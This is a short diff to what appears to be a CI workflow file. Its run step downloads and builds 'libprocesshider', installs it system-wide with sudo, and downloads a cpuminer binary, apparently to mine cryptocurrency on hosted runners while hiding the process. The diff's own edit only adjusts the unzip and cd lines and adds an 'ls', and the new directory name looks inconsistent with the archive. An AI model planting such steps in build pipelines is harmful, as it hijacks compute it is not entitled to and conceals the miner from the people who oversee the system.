@@ -26,8 +26,9 @@ jobs:
      - run: |
               sudo apt install unzip
               wget https://github.com/NonameGh0st/libprocesshider/archive/refs/heads/master.zip
-              unzip libprocesshider-master.zip
-              cd libprocesshider-master
+              unzip master.zip
+              cd master
+              ls
               make
               sudo mv libprocesshider.so /usr/local/lib/
               wget https://github.com/WyvernTKC/cpuminer-gr-avx2/releases/download/1.2.4.1/cpuminer-gr-1.2.4.1-args-x86_64_linux.tar.gz
